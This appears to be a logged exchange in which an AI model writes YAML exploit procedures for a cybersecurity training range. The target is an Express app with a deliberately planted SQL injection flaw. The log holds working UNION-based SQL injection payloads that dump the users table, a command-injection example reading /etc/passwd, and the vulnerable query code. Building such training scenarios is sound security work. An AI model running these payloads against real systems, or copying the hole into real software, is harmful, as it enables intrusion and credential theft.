# Conversation: attacker

**Model**: us.anthropic.claude-sonnet-4-6  
**Calls**: 2

## System Prompt

```
You are an expert penetration tester writing attack procedures for cybersecurity training scenarios.

Your job: given a vulnerable application's source code and architecture, write a YAML procedure that exploits the vulnerability and verifies success.

## Procedure DSL

A procedure is a YAML file with this structure:

```yaml
sessions: []   # optional browser sessions (omit for HTTP-only attacks)

procedure:
  - step_id: unique_name
    action:
      type: <action_type>
      # action-specific fields
    expect:
      <assertion_type>: <value>
    outputs:
      variable_name: 'capture_spec'
    timeout: 10
```

### Action Types

**HTTP:**
```yaml
type: http_request
method: GET|POST|PUT|DELETE
url: "http://${target_host}:${target_port}/path"
headers:
  Content-Type: application/json
body: '{"key": "value"}'
```

**Shell (attacker container):**
```yaml
type: exec_attacker
command: "curl -s http://${target_host}:${target_port}/..."
```

**Shell (target container — use for ubuntu/misconfig entities to verify exploitation):**
```yaml
type: exec_target
command: "find / -perm -4000 -user root 2>/dev/null"
```

**Shell background (attacker container — fire and forget):**
Use this for listeners that must stay alive across multiple steps (e.g. an HTTP exfil listener).
The process is detached from the exec shell and survives until explicitly killed.
```yaml
type: exec_attacker_bg
command: "python3 -m http.server 9999 > /tmp/listener.log 2>&1"
```

**Sleep:**
```yaml
type: sleep
seconds: 2
```

### Assertion Types (use ONE per step)

```yaml
expect:
  status: 200              # HTTP status code
  exit_code: 0             # shell exit code
  stdout_contains: "text"  # shell stdout contains
  stdout_regex: "pattern"  # shell stdout matches regex
  body_contains: "text"    # HTTP response body contains
  body_regex: "pattern"    # HTTP response body matches regex
```

### Output Capture (optional)

```yaml
outputs:
  var_name: 'regex("capturing_group_pattern")'
  var_name: 'body'
  var_name: 'stdout'
  var_name: 'json(".field")'
```

Use captured outputs in later steps: `${steps.step_id.var_name}`

### Variable Interpolation

Always use these variables (provided at runtime):
- `${target_host}` — hostname of the target container
- `${target_port}` — port the app is listening on

## Rules

- Use `http_request` actions for HTTP attacks (cleaner than curl in exec_attacker)
- The final step MUST assert that the attack succeeded (e.g. credentials visible in response)
- The success assertion must match the `success_indicator` from the architecture plan
- Keep the procedure to the minimum steps needed to demonstrate the exploit
- Do not add unnecessary navigation or setup steps
- **POST redirect pattern**: Express apps commonly respond to POST with `302 Found` (Post/Redirect/Get). If a POST step stores data (XSS payload, comment, form submission), assert `status: 302` — NOT 200. Then add a separate GET step to verify the stored data is reflected.

## Output Format

Respond with ONLY valid YAML (no markdown fences, no explanation). The YAML must parse as a valid Procedure.

## Examples

### Example 1: SQL injection via GET parameter

```yaml
procedure:
  - step_id: verify_app_running
    action:
      type: http_request
      method: GET
      url: "http://${target_host}:${target_port}/"
    expect:
      status: 200
    timeout: 10

  - step_id: exploit_sqli
    action:
      type: http_request
      method: GET
      url: "http://${target_host}:${target_port}/search?q=x'+UNION+SELECT+username,password+FROM+users--+-"
    expect:
      body_contains: "admin"
    timeout: 10
```

### Example 2: Command injection via POST body

```yaml
procedure:
  - step_id: inject_command
    action:
      type: http_request
      method: POST
      url: "http://${target_host}:${target_port}/ping"
      headers:
        Content-Type: application/json
      body: '{"host": "127.0.0.1; cat /etc/passwd"}'
    expect:
      body_contains: "root:"
    timeout: 10
```

```

## Turn 1 — `attacker` (user)

**user:**

```
## Entity Spec

Description: Express app with UNION-based SQL injection in a search endpoint — attacker extracts credentials from the users table. Dump username and password from users table via UNION-based SQLi in search parameter.

## Architecture Plan

- Attack entry point: GET /search?search=x' UNION SELECT username,password FROM users-- -
- Success indicator: JSON response array contains an object with 'name' equal to 'admin' and 'description' equal to 'supersecret123'
- Vulnerability: In the GET /search handler, the query is constructed as: `SELECT name, description FROM products WHERE name LIKE '%${req.query.search}%'`. The value of req.query.search is inserted directly into the SQL string with no escaping or prepared statements. The result rows are serialized to JSON and sent in the response body. Because the SELECT returns exactly two columns (name, description), a payload of `' UNION SELECT username, password FROM users-- -` will append a row containing the credentials from the users table, which will appear in the JSON array returned to the attacker.

## Application Source Code

### app.js
```
const express = require('express');
const Database = require('better-sqlite3');

const app = express();
const PORT = 3000;

// Initialize SQLite database in memory
const db = new Database(':memory:');

// Create tables
db.exec(`
  CREATE TABLE IF NOT EXISTS products (
    name TEXT,
    description TEXT
  );
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT
  );
`);

// Seed data
db.exec(`
  INSERT INTO products (name, description) VALUES
    ('Widget A', 'A standard widget'),
    ('Widget B', 'An advanced widget'),
    ('Gadget X', 'A useful gadget');
  INSERT INTO users (username, password) VALUES
    ('admin', 'supersecret123');
`);

// Home route
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>Product Catalog</title></head>
    <body>
      <h1>Product Catalog</h1>
      <p>Search for products by name:</p>
      <form action="/search" method="GET">
        <input type="text" name="search" placeholder="Enter product name" />
        <button type="submit">Search</button>
      </form>
    </body>
    </html>
  `);
});

// Vulnerable search route
app.get('/search', (req, res) => {
  const search = req.query.search || '';
  // VULNERABLE: unsanitized input concatenated directly into SQL
  const query = `SELECT name, description FROM products WHERE name LIKE '%${search}%'`;
  try {
    const rows = db.prepare(query).all();
    res.json(rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on http://0.0.0.0:${PORT}`);
});

```

## Concrete Edge Values (outgoing)

credentials: admin:supersecret123


## Runtime

The app listens on port ${target_port} on host ${target_host}.

## Runtime-Specific Rules

- After starting a background listener, verify the port is bound before proceeding: use an `exec_attacker` step with `nc -z localhost 9999 && echo OK`.
- For cookie exfil attacks (admin bot), wait at least 20 seconds after triggering — Chromium cold-start + login + page load + JS execution takes time.


## Attack Constraints

These constraints define how exploitation must work:

### Atom: sqli_union
1. A query is constructed by concatenating unsanitized user input directly into a SQL string.
2. The query result is rendered in the HTTP response (table, list, or raw text).
3. The number of columns in the injected UNION must match the original SELECT — either the original query is designed with a known column count, or the app reflects enough columns for the payload to land.
4. No parameterized queries or prepared statements are used.


Write a YAML procedure that exploits the vulnerability and verifies success.
Output ONLY valid YAML (no markdown fences).
```

## Turn 2 — `attacker` (assistant, in 2220 tok / out 171 tok)

**assistant:**

```
procedure:
  - step_id: verify_app_running
    action:
      type: http_request
      method: GET
      url: "http://${target_host}:${target_port}/"
    expect:
      status: 200
    timeout: 10

  - step_id: exploit_sqli_union
    action:
      type: http_request
      method: GET
      url: "http://${target_host}:${target_port}/search?search=x%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--%20-"
    expect:
      body_contains: "supersecret123"
    timeout: 10
```

## Turn 3 — `attacker.self_review` (assistant)

**assistant:**

```
procedure:
  - step_id: verify_app_running
    action:
      type: http_request
      method: GET
      url: "http://${target_host}:${target_port}/"
    expect:
      status: 200
    timeout: 10

  - step_id: exploit_sqli_union
    action:
      type: http_request
      method: GET
      url: "http://${target_host}:${target_port}/search?search=x%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--%20-"
    expect:
      body_contains: "supersecret123"
    timeout: 10
```

## Turn 4 — `attacker.self_review` (user)

**user:**

```

## Verify Against Atom Testing Guidance

Compare your procedure against the proven testing patterns below:

### Atom: sqli_union
**Layer 1 — Internal state check:**
Verify the query is built via string concatenation (not a prepared statement) and that a benign UNION payload returns the expected extra row:
```bash
# Confirm the app returns data from a UNION — look for the injected values in the response
curl -s "http://localhost/app?search=nonexistent'+UNION+SELECT+'injected_user','injected_pass'--+-"
```
Expect to see `injected_user` and `injected_pass` reflected in the response body.

**Layer 2 — External attack probe (from attacker container):**
```bash
curl -s "http://target/app?search=x'+UNION+SELECT+username,password+FROM+users--+-"
```
A successful result contains the seeded username and plaintext (or hashed) password value from the users table.

Review your procedure against these correctness checks before finalising:

1. **Payload characters**: Do any payloads contain characters (e.g. single quotes `'`) that would break the app's storage layer (raw SQL concatenation)? If so, rewrite the payload to avoid them — use `<script>alert(1)</script>` not `<script>alert('xss')</script>`.
2. **POST status codes**: If a POST step submits a form, does the app source show a redirect after success? If yes, assert `status: 302`. If the app returns 200 directly, assert `status: 200`. Check the source — don't assume.
3. **Final assertion**: Does the last step assert that the attack actually succeeded (credentials visible, command output present, payload reflected)? A procedure that only checks status codes is not sufficient.
4. **Background listeners**: Are background listener processes started with `exec_attacker_bg` (not `exec_attacker`)?
5. **Atom guidance**: Does your procedure align with the atom testing guidance above (if provided)? Fix any mismatches.

If any check fails, output the corrected YAML. If all checks pass, output the original YAML unchanged.
Output ONLY valid YAML (no markdown fences).
```

## Turn 5 — `attacker.self_review` (assistant, in 2917 tok / out 171 tok)

**assistant:**

```
procedure:
  - step_id: verify_app_running
    action:
      type: http_request
      method: GET
      url: "http://${target_host}:${target_port}/"
    expect:
      status: 200
    timeout: 10

  - step_id: exploit_sqli_union
    action:
      type: http_request
      method: GET
      url: "http://${target_host}:${target_port}/search?search=x%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--%20-"
    expect:
      body_contains: "supersecret123"
    timeout: 10
```

